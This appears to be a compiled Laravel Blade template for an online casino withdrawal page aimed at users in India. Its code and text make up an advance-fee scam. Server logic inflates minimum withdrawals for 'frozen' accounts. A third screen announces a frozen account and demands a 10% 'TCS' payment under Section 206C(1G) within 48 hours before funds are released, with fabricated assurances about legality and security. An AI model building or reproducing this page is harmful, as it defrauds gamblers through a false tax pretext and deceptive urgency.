<?php if(!Auth::check()): ?>
<script>
  window.location.href = '/?modal=regquick';
</script>
<?php endif; ?>

<?php if(Auth::check() && Auth::user()->ban && request()->path() !== 'blocked'): ?>
<?php echo $__env->make('blocked', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
<?php else: ?>
<?php if(auth()->guard()->check()): ?>


<?php
$settings = \App\Setting::first();
$min_with = $settings->min_withdrawal_amount;

if (\Auth::user()->balance < $settings->frozen_amount && \Auth::user()->frozen == 1) {
  $min_with = 60000;
  }

  if(\Auth::user()->balance < 1500){
    $min_with=1500;
    }
    ?>

    

    <?php
    $count = \App\WithdrawFrozen::where('user_id', auth()->id())->count();


    ?>

    <link rel="stylesheet" href="./styles/output.css?v=2" />
    <div class="globalContainer globalContainer_output">
      <div class="screenWrapper">
        <!-- Вікно 1: Вибір методу -->
        <div class="pagesContainer">
          <div class="up_page up_page_1">
            <div class="up_header">
              <button class="up_back_button">
                <img src="./img/arrow.svg" alt=""><?php echo e(__('common.casino')); ?>

              </button>
              <div class="up_h1"><?php echo e(__('common.withdrawal')); ?></div>
            </div>
            <div class="up_container">
              <a class="up_login-btn" href="/withdrawals" style="margin-top: 0px; margin-bottom: 10px;">
                <?php echo e(__('common.my-withdrawals')); ?>

              </a>
              <div class="up_balance-box">
                <p class="up_balance-label"><?php echo e(__('common.available-balance')); ?></p>
                <p class="up_balance-amount" data-balance="<?php echo e(auth()->user()->balance); ?>"></p>
              </div>
              <?php if($count === 0): ?>
              <div class="up_blance-title" style="margin-bottom: 10px;"><?php echo e(__('common.all-methods')); ?>:</div>
              <div class="up_methods_pay">
                <?php $SystemWithraws = \App\SystemWithdraw::all(); ?>
                <?php $__currentLoopData = $SystemWithraws; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $s): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                <?php if($s->off == 0): ?>
                <a href="javascript:void(0)" class="up_item_pay"
                  data-method-id="<?php echo e($s->id); ?>"
                  data-method-name="<?php echo e($s->name); ?>"
                  data-from="<?php echo e($min_with); ?>"
                  data-to="54000000.00"
                  data-recommended="<?php echo e($min_with); ?>">
                  <img src="<?php echo e($s->img); ?>" alt=""><span><?php echo e($s->name); ?></span>
                </a>
                <?php endif; ?>
                <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>

              </div>
              <?php endif; ?>
            </div>
          </div>
          <!-- Вікно 2: Форма виводу -->
          <div class="up_page up_page_2">
            <div class="up_header up_header_secondScreen">
              <button class="up_back_button">
                <img src="./img/arrow.svg" alt=""><?php echo e(__('common.back')); ?>

              </button>
              <div class="up_h1"><?php echo e(__('common.withdrawal')); ?></div>

            </div>
            <div class="up_container up_withdraw-form">
              <div class="up_balance-box">
                <p class="up_balance-label"><?php echo e(__('common.available-balance')); ?></p>
                <p class="up_balance-amount"><?php echo e(\App\Setting::first()->currency); ?> 0.00</p>
              </div>
              <div class="up_pay_change_container">
                <div class="up_pay_change_method">
                  <img class="up_method-icon" src="./img/google.svg" alt="">
                  <span class="selected-method">Google Pay</span>
                </div>
                <button class="up_pay_change_button"><?php echo e(__('common.сhange')); ?></button>
              </div>
              <div class="up_h3" style="margin-top: 25px;"><?php echo e(__('common.enter-amount')); ?></div>
              <div class="up_input-group up_input" id="amountGroup">
                <div class="up_icon-wrapper">
                  <div style="color: #77829b;
    font-family: Inter;
    font-size: 14px;
    font-weight: 800;" class="up_icon-wrapper">
                <?php echo e(\App\Setting::first()->currency); ?>

                
              </div>
                </div>
                <input type="text" class="up_input up_input-bold" placeholder="<?php echo e(__('common.amount')); ?>" required>
              </div>
              <div class="up_text_input_small">
                <div class="up_h4"><?php echo e(__('common.one-withdrawal-limit')); ?></div>
                <div class="up_h4"><?php echo e(__('common.from')); ?> <?php echo e(\App\Setting::first()->currency); ?> <span class="up_from"></span> <?php echo e(__('common.to')); ?> <?php echo e(\App\Setting::first()->currency); ?> <span class="up_to"></span></div>
              </div>
              <div class="up_amounts_select_container">
                <button type="button" class="up_amounts_select_item">50,000</button>
                <button type="button" class="up_amounts_select_item">100,000</button>
                <button type="button" class="up_amounts_select_item">150,000</button>
                <button type="button" class="up_amounts_select_item">200,000</button>
              </div>
              
              <div class="up_input-group up_input" id="amountGroup">
                <input type="text" class="up_input" id="full_name" placeholder="<?php echo e(__('common.full-name')); ?>">
              </div>
  
              <div class="up_input-group up_input" id="amountGroup">
                <input type="text" class="up_input" id="bank_account" placeholder="<?php echo e(__('common.card-number')); ?>">
              </div>
              <!--<button type="button" class="up_pay_button_learn" id="howToBtn">
        <img src="./img/play.svg" alt="?">How to withdrawal?
        </button>!-->
              <?php if(auth()->guard()->check()): ?>
              <?php if(Auth::user()->admin != 3): ?>
              <button type="button" class="up_login-btn" id="withdrawalBtn" style="margin-top: 10px;" disabled>
                <?php echo e(__('common.withdrawal')); ?>

              </button>
              <?php endif; ?>
              <?php endif; ?>


              <a class="up_pay_button_learn" target="_blank" href="<?php echo e($settings->support_contact); ?>" style="margin-top: 10px;">
                <?php echo e(__('common.support')); ?>

              </a>
            </div>
          </div>

          <!-- Вікно 4: Інструкція до оплати -->
          <div class="up_page up_page_3">
            <div class="up_header up_header_secondScreen">
              <button class="up_back_button">
                <img src="./img/arrow.svg" alt="">Back
              </button>
              <div class="up_h1">Withdrawal</div>
            </div>
            <div class="up_container">
              <div class="up_balance-box">
                <p class="up_balance-label">Available balance</p>
                <p class="up_balance-amount"><?php echo e(\App\Setting::first()->currency); ?> 0.00</p>
              </div>
              <div class="up_warning-title">
                <div class="up_warning-indicator"></div>
                Your account has been temporarily frozen! 206C(1G)
              </div>
              <div id="goPayBlock" class="up_alert" style="margin-top: 25px;">
                <div class="up_flex-row" style="justify-content: space-between;">
                  <p class="up_text-muted">Amount to be paid </p>
                  <p class="up_text-muted"> Tax percentage</p>
                </div>
                <div class="up_flex-row" style="justify-content: space-between;">
                  <p class="up_text-dark up_res_10" style="font-weight: 700; font-size: 18px;"><?php echo e(\App\Setting::first()->currency); ?> 00.00</p>
                  <p class="up_text-dark" style="font-weight: 700; font-size: 18px;">10.00%</p>
                </div>
              </div>
              <div class="up_text-start up_text-dark"
                style="margin-top: 25px; display: flex; align-items: center; gap: 10px; font-weight: 700;">
                <div class="up_success-indicator"></div>
                <div>
                  After payment, the entire balance of <span class="up_green-text up_balance-amount"><?php echo e(\App\Setting::first()->currency); ?>

                    00.00</span> will
                  be withdrawn within
                  30
                  minutes
                </div>
              </div>
              <p class="up_info-section-title">Select payment method:</p>
              <div class="up_methods_pay">
                <?php $systemDeps = \App\SystemDep::orderBy('sort', 'asc')->orderBy('id', 'asc')->where('off', 0)->get(); ?>
                <?php $__currentLoopData = $systemDeps; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $s): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>


                <a href="javascript:void(0)" class="up_item_pay_other" data-method-id="<?php echo e($s->id); ?>"
                  data-method-name="<?php echo e($s->name); ?>">
                  <img src="<?php echo e($s->img); ?>" alt=""><span><?php echo e($s->name); ?></span>
                </a>
                <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
              </div>
              <button type="button" class="up_reg-btn" style="margin-top: 25px;" id="btn-pay" disabled>
                Pay
              </button>
              <div>
                <p class="up_info-section-title">How to withdraw funds? Why is the account frozen?</p>
                <p class="up_min-text">Your account has been temporarily frozen in accordance with Indian legal
                  requirements.
                  As
                  a resident of India, any funds received from a foreign company are subject to Tax Collected at
                  Source
                  (TCS)
                  under Section 206C(1G) of the Income Tax Act, 1961. The current TCS rate is 20% of the payout.
                </p>
                <br />
                <p class="up_min-title">What we are doing for you:</p>
                <p class="up_min-text">We will cover half of this amount—10% of your winnings—on your behalf.</p>
                <br />
                <p class="up_min-title">What you need to do:</p>
                <p class="up_min-text">To unblock your account and process your payout, please remit the remaining
                  10% TCS
                  within the next 48 hours. As soon as we receive your portion, we will immediately release your
                  funds.</p>
                <br>
                <p class="up_min-title">Why this is necessary:</p>

                <ul class="up_min-text" style="padding-left: 15px;">
                  <li>Legality. Compliance with Section 206C(1G) is mandatory. Failure to collect and remit TCS
                    may
                    result
                    in
                    penalties and legal liability.</li>
                  <li>Transparency. Withholding tax at source ensures full adherence to the Income Tax Act and RBI
                    regulations.
                  </li>
                  <li>Security. Payment of TCS confirms the integrity of the transaction and protects your
                    interests
                    in
                    international transfers.</li>
                </ul>
                <br />
                <p class="up_min-text">If you have any questions about making the payment, our support team is
                  ready
                  to
                  assist
                  you at any time.</p>
              </div>
              <a href="#goPayBlock" class="up_pay_button_learn" style="color: #19AB59;">
                I am ready
                to pay and withdraw
              </a>
              <a target="_blank" href="<?php echo e($settings->support_contact); ?>" class="up_login-btn" style="margin-top: 10px;">Support</a>
            </div>
          </div>
        </div>
      </div>
    </div>





    <script src="./scripts/output.js?v=2032222222324232227222222222222222"></script>




    <?php else: ?>
    <script type="text/javascript">
      location.href = '/';
    </script>
    <?php endif; ?>
    <?php endif; ?><?php /**PATH /var/www/product/resources/views/withdrawal.blade.php ENDPATH**/ ?>